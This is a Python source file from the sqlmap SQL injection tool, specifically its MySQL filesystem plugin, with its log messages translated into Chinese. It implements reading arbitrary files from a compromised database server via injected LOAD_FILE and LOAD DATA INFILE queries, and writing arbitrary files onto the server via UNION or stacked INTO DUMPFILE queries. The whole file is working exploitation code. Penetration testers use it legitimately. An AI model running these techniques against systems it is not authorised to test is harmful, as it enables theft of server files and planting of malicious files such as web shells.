#!/usr/bin/env python
#coding=utf-8
"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomStr
from lib.core.common import singleTimeWarnMessage
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.enums import PLACE
from lib.core.exception import SqlmapNoneDataException
from lib.request import inject
from lib.techniques.union.use import unionUse
from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    def __init__(self):
        GenericFilesystem.__init__(self)

    def nonStackedReadFile(self, rFile):
        infoMsg = u"获取文件: '%s'" % rFile
        logger.info(infoMsg)

        result = inject.getValue("HEX(LOAD_FILE('%s'))" % rFile, charsetType=CHARSET_TYPE.HEXADECIMAL)

        return result

    def stackedReadFile(self, rFile):
        infoMsg = u"获取文件: '%s'" % rFile
        logger.info(infoMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "longtext")
        self.getRemoteTempPath()

        tmpFile = "%s/tmpf%s" % (conf.tmpPath, randomStr(lowercase=True))

        debugMsg = u"将文件'%s'的十六进制编码内容保存到临时文件'%s' " % (rFile, tmpFile)
        logger.debug(debugMsg)
        inject.goStacked("SELECT HEX(LOAD_FILE('%s')) INTO DUMPFILE '%s'" % (rFile, tmpFile))

        debugMsg = u"将十六进制编码文件'%s'的内容加载到支持表中" % rFile
        logger.debug(debugMsg)
        inject.goStacked("LOAD DATA INFILE '%s' INTO TABLE %s FIELDS TERMINATED BY '%s' (%s)" % (tmpFile, self.fileTblName, randomStr(10), self.tblField))

        length = inject.getValue("SELECT LENGTH(%s) FROM %s" % (self.tblField, self.fileTblName), resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

        if not isNumPosStrValue(length):
            warnMsg = u"无法检索文件'%s'的内容" % rFile

            if conf.direct or isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
                warnMsg += u", 将回溯到更简单的UNION技术"
                logger.warn(warnMsg)
                result = self.nonStackedReadFile(rFile)
            else:
                raise SqlmapNoneDataException(warnMsg)
        else:
            length = int(length)
            sustrLen = 1024

            if length > sustrLen:
                result = []

                for i in xrange(1, length, sustrLen):
                    chunk = inject.getValue("SELECT MID(%s, %d, %d) FROM %s" % (self.tblField, i, sustrLen, self.fileTblName), unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)

                    result.append(chunk)
            else:
                result = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.fileTblName), resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)

        return result

    def unionWriteFile(self, wFile, dFile, fileType, forceCheck=False):
        logger.debug(u"将文件编码为十六进制字符串值")

        fcEncodedList = self.fileEncode(wFile, "hex", True)
        fcEncodedStr = fcEncodedList[0]
        fcEncodedStrLen = len(fcEncodedStr)

        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:
            warnMsg = u"注入的是一个GET参数，要写入的文件十六进制值为%d字节，" % fcEncodedStrLen
            warnMsg += u"这可能会导致文件写入过程中的错误"
            logger.warn(warnMsg)

        debugMsg = u"将%s文件内容导出到文件'%s'" % (fileType, dFile)
        logger.debug(debugMsg)

        pushValue(kb.forceWhere)
        kb.forceWhere = PAYLOAD.WHERE.NEGATIVE
        sqlQuery = "%s INTO DUMPFILE '%s'" % (fcEncodedStr, dFile)
        unionUse(sqlQuery, unpack=False)
        kb.forceWhere = popValue()

        warnMsg = u"将文件中的垃圾字符(乱码)作为UNION查询的剩余字符"
        singleTimeWarnMessage(warnMsg)

        return self.askCheckWrittenFile(wFile, dFile, forceCheck)

    def stackedWriteFile(self, wFile, dFile, fileType, forceCheck=False):
        debugMsg = u"创建支持写入十六进制编码文件的表"
        logger.debug(debugMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "longblob")

        logger.debug(u"将文件编码为十六进制字符串值")
        fcEncodedList = self.fileEncode(wFile, "hex", False)

        debugMsg = u"伪造SQL语句将十六进制编码文件写入支持的表"
        logger.debug(debugMsg)

        sqlQueries = self.fileToSqlQueries(fcEncodedList)

        logger.debug(u"将十六进制编码文件插入支持的表")

        for sqlQuery in sqlQueries:
            inject.goStacked(sqlQuery)

        debugMsg = u"将%s文件内容导出到文件'%s'" % (fileType, dFile)
        logger.debug(debugMsg)

        # Reference: http://dev.mysql.com/doc/refman/5.1/en/select.html
        inject.goStacked("SELECT %s FROM %s INTO DUMPFILE '%s'" % (self.tblField, self.fileTblName, dFile), silent=True)

        return self.askCheckWrittenFile(wFile, dFile, forceCheck)
